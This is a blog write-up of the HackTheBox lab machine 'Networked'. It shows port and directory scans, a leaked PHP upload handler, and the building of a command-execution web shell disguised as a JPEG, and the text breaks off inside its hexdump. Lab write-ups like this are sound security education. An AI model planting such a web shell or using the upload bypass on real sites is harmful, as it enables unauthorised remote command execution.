@@ -1,0 +1,303 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en-us lang=en-us><head>&lt; <title itemprop=name>Networked :: Sequr (dev)</title>
+<script defer language=javascript type=text/javascript src=/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="noodp, noydir"><meta name=googlebot content="noodp, noydir"><link rel=canonical href=https://dev.sequr.be/blog/hackthebox/machine/hackthebox-networked/ itemprop=url><meta name=url content="https://dev.sequr.be/blog/hackthebox/machine/hackthebox-networked/"><link rel=icon href=favicon.ico><meta itemprop=name content="Networked"><meta itemprop=description content="Write-up of the Networked machine by guly on HackTheBox.eu."><meta itemprop=datePublished content="2019-11-18T17:45:47+00:00"><meta itemprop=dateModified content="2019-11-18T17:45:47+00:00"><meta itemprop=wordCount content="1896"><meta itemprop=image content="https://dev.sequr.be/img/networked.png"><meta itemprop=keywords content="Guly,HackTheBox.eu,Machine,Misc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://dev.sequr.be/img/networked.png"><meta name=twitter:title content="Networked"><meta name=twitter:description content="Write-up of the Networked machine by guly on HackTheBox.eu."><meta property="og:url" content="https://dev.sequr.be/blog/hackthebox/machine/hackthebox-networked/"><meta property="og:site_name" content="Sequr (dev)"><meta property="og:title" content="Networked"><meta property="og:description" content="Write-up of the Networked machine by guly on HackTheBox.eu."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2019-11-18T17:45:47+00:00"><meta property="article:modified_time" content="2019-11-18T17:45:47+00:00"><meta property="article:tag" content="Guly"><meta property="article:tag" content="HackTheBox.eu"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Misc"><meta property="og:image" content="https://dev.sequr.be/img/networked.png"><meta name=description content="Write-up of the Networked machine by guly on HackTheBox.eu."><meta itemprop=description content="Write-up of the Networked machine by guly on HackTheBox.eu."><meta property="og:updated_time" content="2019-11-18T17:45:47Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dev.sequr.be/sitemap.xml><meta name=apple-mobile-web-app-title content="Sequr (dev)"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><link type=text/css rel=stylesheet href=/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css integrity="sha256-lKM5g2+J8NJfMZgMtrBjHaIeIK8Sgwh0fOROBSXrFu8=" crossorigin=anonymous><style>body{--sidebar-bg-color:#202020;--sidebar-img-border-color:#515151;--sidebar-p-color:#909090;--sidebar-h1-color:#FFF;--sidebar-a-color:#FFF;--sidebar-socials-color:#FFF;--text-color:#222;--bkg-color:#FAF9F6;--post-title-color:#303030;--list-color:#5A5A5A;--link-color:#268BD2;--date-color:#515151;--table-border-color:#E5E5E5;--table-stripe-color:#F9F9F9;--code-color:#000;--code-background-color:#E5E5E5;--code-block-color:#FFF;--code-block-background-color:#272822;--moon-sun-color:#FFF;--moon-sun-background-color:#515151}body.dark-theme{--text-color:#EEE;--bkg-color:#121212;--post-title-color:#DBE2E9;--list-color:#9D9D9D;--link-color:#268BD2;--date-color:#9A9A9A;--table-border-color:#515151;--table-stripe-color:#202020;--code-color:#FFF;--code-background-color:#515151;--code-block-color:#FFF;--code-block-background-color:#272822}body{background-color:var(--bkg-color)}</style></head><body><div class=wrapper><aside class=sidebar><div class="container sidebar-sticky"><div class=light-dark align=right><button class=btn-light-dark title="Toggle light/dark mode"><svg class="moon" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M6 .278a.768.768.0 01.08.858 7.208 7.208.0 00-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527.0 1.04-.055 1.533-.16a.787.787.0 01.81.316.733.733.0 01-.031.893A8.349 8.349.0 018.344 16C3.734 16 0 12.286.0 7.71.0 4.266 2.114 1.312 5.124.06A.752.752.0 016 .278z"/></svg><svg class="sun" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 0zm0 13a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 13zm8-5a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2a.5.5.0 01.5.5zM3 8a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2A.5.5.0 013 8zm10.657-5.657a.5.5.0 010 .707l-1.414 1.415a.5.5.0 11-.707-.708l1.414-1.414a.5.5.0 01.707.0zm-9.193 9.193a.5.5.0 010 .707L3.05 13.657a.5.5.0 01-.707-.707l1.414-1.414a.5.5.0 01.707.0zm9.193 2.121a.5.5.0 01-.707.0l-1.414-1.414a.5.5.0 01.707-.707l1.414 1.414a.5.5.0 010 .707zM4.464 4.465a.5.5.0 01-.707.0L2.343 3.05a.5.5.0 11.707-.707l1.414 1.414a.5.5.0 010 .708z"/></svg></button></div><div class=sidebar-about><h1 class=brand><a href=https://dev.sequr.be/><img src=logo.png alt="brand image">
+</a><a href=https://dev.sequr.be/><h1>Sequr (dev)</h1></a></h1><p class=lead>Dev version of sequr.be. This site may break at any time.</p></div><nav><ul class=sidebar-nav><li class=heading><a href=/about/>About</a></li><li class=heading>Blog</li><li class=heading><a href=/privacy/>Privacy</a></li></ul></nav><a target=_blank class=social title="RSS Feed" href=/posts/index.xml><svg width="1em" height="1.2em" viewBox="0 0 1280 1280"><g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentcolor"><path d="M2295 11929c-284-12-642-45-707-65-17-5-18-63-18-1039 0-569 4-1036 8-1039 5-3 74 6 153 19 510 86 1168 95 1789 25 1348-153 2602-677 3670-1531 385-308 820-744 1126-1129 842-1060 1362-2313 1514-3650 70-621 61-1279-25-1789-13-79-22-148-19-153 3-4 471-8 1039-8h1035l5 23c51 225 85 942 67 1419-23 605-77 1044-198 1617-294 14e2-927 2734-1823 3846-1043 1295-2364 2259-3909 2854-1158 447-2451 656-3707 6e2z"/><path d="M2255 7845c-269-25-620-81-667-106-17-9-18-55-18-899 0-706 3-890 13-890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207-107 2267-823 2814-1902 166-327 268-637 330-1001 38-227 48-384 42-662-8-348-44-590-126-831-23-66-41-126-41-132 0-10 184-13 890-13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782-59 703-233 1323-545 1945-481 956-1313 1788-2270 2268-620 310-1239 483-1940 542-165 14-669 10-840-5z"/><path d="M2519 3815c-391-66-725-336-868-703-79-201-96-462-45-677 83-344 338-641 666-774 116-47 205-69 330-80 412-39 811 153 1040 5e2 193 292 240 648 128 981-135 403-492 699-914 757-1e2 14-241 12-337-4z"/></g></svg></a><p class=footnote>&copy; 2019
+• <a class="p-name u-url" href=https://sequr.be>DezeStijn</a>
+• &lt;a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0&lt;/a></p></div></aside><main class="content container"><div class=post><div class=info><h1 class=post-title><a href=https://dev.sequr.be/blog/hackthebox/machine/hackthebox-networked/>Networked</a></h1><div class=headline><div><span>DezeStijn - </span><time datetime=2019-11-18T17:45:47Z class=post-date>November 18, 2019
+</time><span>- </span><span class=reading-time><span>9 mins read</span></span></div><ul class=tags><li class=tag-guly><a href=https://dev.sequr.be/tags/guly>guly</a></li><li class=tag-HackTheBox.eu><a href=https://dev.sequr.be/tags/hackthebox.eu>HackTheBox.eu</a></li><li class=tag-Machine><a href=https://dev.sequr.be/tags/machine>Machine</a></li><li class=tag-Misc><a href=https://dev.sequr.be/tags/misc>Misc</a></li></ul></div></div><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=machine-info>Machine info</h2><p>Networked [by <a href=https://www.hackthebox.eu/home/users/profile/8292 target=_blank>guly</a>]<br>IP: 10.10.10.146<br>OS: Linux<br>Difficulty: Easy<br>Release: 24 Aug 2019</p><h2 id=recon>Recon</h2><h3 id=nmap>Nmap</h3><p>As usual we kick off with a nmap scan of the box</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.70 scan initiated Mon Sep 16 22:03:11 2019 as: nmap -v -p- -T4 -oN scanning/nmap-allports 10.10.10.146</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.146
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.049s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65532</span> filtered ports
+</span></span><span style=display:flex><span>PORT    STATE  SERVICE
+</span></span><span style=display:flex><span>22/tcp  open   ssh
+</span></span><span style=display:flex><span>80/tcp  open   http
+</span></span><span style=display:flex><span>443/tcp closed https
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Mon Sep 16 22:07:27 2019 -- 1 IP address (1 host up) scanned in 256.67 seconds</span>
+</span></span></code></pre></div><p>Ports 22 and 80 are open.<br>Let&rsquo;s start with checking the website.</p><p>The index pages shows some text, but mainly the source code is important as there&rsquo;s a reference to an upload functionality and a gallery.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>Hello mate, we&#39;re building the new FaceMash!&lt;/<span style=color:#f92672>br</span>&gt;
+</span></span><span style=display:flex><span>Help by funding us and be the new Tyler<span style=color:#960050;background-color:#1e0010>&amp;</span>Cameron!&lt;/<span style=color:#f92672>br</span>&gt;
+</span></span><span style=display:flex><span>Join us at the pool party this Sat to get a glimpse
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- upload and gallery not yet linked --&gt;</span>
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>Let&rsquo;s run dirb to find potentially interesting folders or files.</p><p>In the first run without any extensions, using the big.txt wordlist, we find a 2 folders: backup and uploads.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>DIRB v2.22    
+</span></span><span style=display:flex><span>By The Dark Raver
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OUTPUT_FILE: scanning/dirb_big
+</span></span><span style=display:flex><span>START_TIME: Mon Sep  <span style=color:#ae81ff>9</span> 16:49:07 <span style=color:#ae81ff>2019</span>
+</span></span><span style=display:flex><span>URL_BASE: http://10.10.10.146/
+</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+</span></span><span style=display:flex><span>OPTION: Printing LOCATION header
+</span></span><span style=display:flex><span>OPTION: Not Stopping on warning messages
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GENERATED WORDS: <span style=color:#ae81ff>20458</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>---- Scanning URL: http://10.10.10.146/ ----
+</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.10.10.146/backup/
+</span></span><span style=display:flex><span>+ http://10.10.10.146/cgi-bin/ <span style=color:#f92672>(</span>CODE:403|SIZE:210<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.10.10.146/uploads/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>---- Entering directory: http://10.10.10.146/backup/ ----
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>!<span style=color:#f92672>)</span> WARNING: Directory IS LISTABLE. No need to scan it.
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>Use mode <span style=color:#e6db74>&#39;-w&#39;</span> <span style=color:#66d9ef>if</span> you want to scan it anyway<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>---- Entering directory: http://10.10.10.146/uploads/ ----
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>END_TIME: Mon Sep  <span style=color:#ae81ff>9</span> 17:19:28 <span style=color:#ae81ff>2019</span>
+</span></span><span style=display:flex><span>DOWNLOADED: <span style=color:#ae81ff>61374</span> - FOUND: <span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>A second run using .php as extension — since I&rsquo;ve got the feeling we&rsquo;re dealing with PHP here — gives us some more interesting files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>DIRB v2.22    
+</span></span><span style=display:flex><span>By The Dark Raver
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OUTPUT_FILE: scanning/dirb_big_php
+</span></span><span style=display:flex><span>START_TIME: Mon Sep  <span style=color:#ae81ff>9</span> 15:48:53 <span style=color:#ae81ff>2019</span>
+</span></span><span style=display:flex><span>URL_BASE: http://10.10.10.146/
+</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+</span></span><span style=display:flex><span>OPTION: Printing LOCATION header
+</span></span><span style=display:flex><span>EXTENSIONS_LIST: <span style=color:#f92672>(</span>.php<span style=color:#f92672>)</span> | <span style=color:#f92672>(</span>.php<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>NUM <span style=color:#f92672>=</span> 1<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GENERATED WORDS: <span style=color:#ae81ff>20458</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>---- Scanning URL: http://10.10.10.146/ ----
+</span></span><span style=display:flex><span>+ http://10.10.10.146/index.php <span style=color:#f92672>(</span>CODE:200|SIZE:229<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>+ http://10.10.10.146/lib.php <span style=color:#f92672>(</span>CODE:200|SIZE:0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>+ http://10.10.10.146/photos.php <span style=color:#f92672>(</span>CODE:200|SIZE:1306<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>+ http://10.10.10.146/upload.php <span style=color:#f92672>(</span>CODE:200|SIZE:169<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>END_TIME: Mon Sep  <span style=color:#ae81ff>9</span> 15:59:10 <span style=color:#ae81ff>2019</span>
+</span></span><span style=display:flex><span>DOWNLOADED: <span style=color:#ae81ff>20458</span> - FOUND: <span style=color:#ae81ff>4</span>
+</span></span></code></pre></div><p>Let&rsquo;s have a look at the upload and photos pages.</p><figure class=center><img src=/img/htb-networked-img1.png alt="Screenshot of upload.php"><figcaption class=center>upload.php</figcaption></figure><figure class=center><img src=/img/htb-networked-img2.png alt="Screenshot of photos.php"><figcaption class=center>photos.php</figcaption></figure><p>I download one of the CentOS images and upload it at upload.php.<br>After uploading the image, I get <code>file uploaded, refresh gallery</code>. I refresh photos.php and now see a new image, named <code>uploaded by 10_10_12_221.png</code>. This means the service also does some renaming of the files.</p><p>Looking in the backup folder, we find a .tar file containing multiple PHP files.</p><figure class=center><img src=/img/htb-networked-img3.png alt=/backup/><figcaption class=center>/backup/</figcaption></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ tar -tf backup.tar 
+</span></span><span style=display:flex><span>index.php
+</span></span><span style=display:flex><span>lib.php
+</span></span><span style=display:flex><span>photos.php
+</span></span><span style=display:flex><span>upload.php
+</span></span></code></pre></div><p><code>upload.php</code> is ofcourse of most interest at the moment.<br>Let&rsquo;s have a look</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>require</span> <span style=color:#e6db74>&#39;/var/www/html/lib.php&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Files will be stored in this folder
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Useful to know if we get command injection, to know where we might be starting from
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#34;UPLOAD_DIR&#34;</span>, <span style=color:#e6db74>&#34;/var/www/html/uploads/&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;submit&#39;</span>]) ) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_FILES[<span style=color:#e6db74>&#34;myFile&#34;</span>])) {
+</span></span><span style=display:flex><span>    $myFile <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#34;myFile&#34;</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check the filetype of the image, calling an external method (lib.php?)
+</span></span></span><span style=display:flex><span><span style=color:#75715e># and if filesize is smaller than 60 kilobytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(<span style=color:#a6e22e>check_file_type</span>($_FILES[<span style=color:#e6db74>&#34;myFile&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>filesize</span>($_FILES[<span style=color:#e6db74>&#39;myFile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>60000</span>)) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;pre&gt;Invalid image file.&lt;/pre&gt;&#39;</span>;
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>displayform</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($myFile[<span style=color:#e6db74>&#34;error&#34;</span>] <span style=color:#f92672>!==</span> <span style=color:#a6e22e>UPLOAD_ERR_OK</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;An error occurred.&lt;/p&gt;&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>displayform</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># File must have one of the following (image) extensions
+</span></span></span><span style=display:flex><span><span style=color:#75715e># check is done by looking at end of filename
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>//$name = $_SERVER[&#39;REMOTE_ADDR&#39;].&#39;-&#39;. $myFile[&#34;name&#34;];
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>list</span> ($foo,$ext) <span style=color:#f92672>=</span> <span style=color:#a6e22e>getnameUpload</span>($myFile[<span style=color:#e6db74>&#34;name&#34;</span>]);
+</span></span><span style=display:flex><span>    $validext <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;.jpg&#39;</span>, <span style=color:#e6db74>&#39;.png&#39;</span>, <span style=color:#e6db74>&#39;.gif&#39;</span>, <span style=color:#e6db74>&#39;.jpeg&#39;</span>);
+</span></span><span style=display:flex><span>    $valid <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span> ($validext <span style=color:#66d9ef>as</span> $vext) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>substr_compare</span>($myFile[<span style=color:#e6db74>&#34;name&#34;</span>], $vext, <span style=color:#f92672>-</span><span style=color:#a6e22e>strlen</span>($vext)) <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>        $valid <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>($valid)) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;Invalid image file&lt;/p&gt;&#34;</span>;
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>displayform</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>exit</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Get remote IP (IP of uploader)
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Replace dots by underscores
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Move file to upload dir, renaming it
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $name <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;.&#39;</span>,<span style=color:#e6db74>&#39;_&#39;</span>,$_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>])<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>.</span>$ext;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    $success <span style=color:#f92672>=</span> <span style=color:#a6e22e>move_uploaded_file</span>($myFile[<span style=color:#e6db74>&#34;tmp_name&#34;</span>], <span style=color:#a6e22e>UPLOAD_DIR</span> <span style=color:#f92672>.</span> $name);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$success) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;Unable to save file.&lt;/p&gt;&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// set proper permissions on the new file
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>chmod</span>(<span style=color:#a6e22e>UPLOAD_DIR</span> <span style=color:#f92672>.</span> $name, <span style=color:#ae81ff>0644</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>displayform</span>();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>Notice that the error message differs depending on the check it failed. This might be used in a blind attack, where you don&rsquo;t know the code but have to base your actions on the resulting error messages.</p><p>Let&rsquo;s also look at <code>lib.php</code> to get some more info on that <code>check_file_type</code> method. Looks like the image MIME type must start with <code>image/</code>. Note that the MIME type is based on the <a href=https://en.wikipedia.org/wiki/List_of_file_signatures target=_blank>magic bytes</a> at the start of the file (at least in PHP).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>check_file_type</span>($file) {
+</span></span><span style=display:flex><span>  $mime_type <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_mime_type</span>($file);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span>($mime_type, <span style=color:#e6db74>&#39;image/&#39;</span>) <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>  }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=get-user>Get user</h2><p>So to try to get a web shell, we need to create a file that has the correct magic bytes, has a correct extension and might be executed by the web server (e.g. because of a second file extension).</p><p>Let&rsquo;s create <code>shell.php.jpg</code>. Note the magic bytes at the beginning of the file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>��� <span style=color:#75715e># FF D8 FF DB / ÿØÿÛ</span>
+</span></span><span style=display:flex><span>&lt;form action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span> method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get&#34;</span>&gt;
+</span></span><span style=display:flex><span>Command: &lt;input type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;cmd&#34;</span> /&gt;&lt;input type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Exec&#34;</span> /&gt;
+</span></span><span style=display:flex><span>&lt;/form&gt;
+</span></span><span style=display:flex><span>Output:&lt;br /&gt;
+</span></span><span style=display:flex><span>&lt;pre&gt;&lt;?php passthru<span style=color:#f92672>(</span>$_REQUEST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;cmd&#39;</span><span style=color:#f92672>]</span>, $result<span style=color:#f92672>)</span>; ?&gt;&lt;/pre&gt;
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>00000000: ffd8 ffe0 0a3c 666f 726d <span style=color:#ae81ff>2061</span> <span style=color:#ae81ff>6374</span> 696f  .....&lt;form actio
+</span></span><span style=display:flex><span>00000010: 6e3d <span style=color:#ae81ff>2222</span> 206d <span style=color:#ae81ff>6574</span> 686f 643d <span style=color:#ae81ff>2267</span> <span style=color:#ae81ff>6574</span>  n<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span> method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>00000020: 223e 0a43 6f6d 6d61 6e64 3a20 3c69 6e70  &#34;</span>&gt;.Command: &lt;inp
+</span></span><span style=display:flex><span>00000030: <span style=color:#ae81ff>7574</span> <span style=color:#ae81ff>2074</span> <span style=color:#ae81ff>7970</span> 653d <span style=color:#ae81ff>2274</span> <span style=color:#ae81ff>6578</span> <span style=color:#ae81ff>7422</span> 206e  ut type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> n
+</span></span><span style=display:flex><span>00000040: 616d 653d <span style=color:#ae81ff>2263</span> 6d64 <span style=color:#ae81ff>2220</span> 2f3e 3c69 6e70  ame<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;cmd&#34;</span> /&gt;&lt;inp
+</span></span><span style=display:flex><span>00000050: <span style=color:#ae81ff>7574</span> <span style=color:#ae81ff>2074</span> <span style=color:#ae81ff>7970</span> 653d <span style=color:#ae81ff>2273</span> <span style=color:#ae81ff>7562</span> 6d69 <span style=color:#ae81ff>7422</span>  ut type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>
+</span></span><span style=display:flex><span>00000060: <span style=color:#ae81ff>2076</span> 616c <span style=color:#ae81ff>7565</span> 3d22 <span style=color:#ae81ff>4578</span> <span style=color:#ae81ff>6563</span> <span style=color:#ae81ff>2220</span> 2f3e   value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Exec&#34;</span> /&gt;
+</span></span><span style=display:flex><span>00000070: 0a3c 2f66 6f72 6d3e 0a4f <span style=color:#ae81ff>7574</span> <span style=color:#ae81ff>7075</span> 743a  .&lt;/form&gt;.Output:
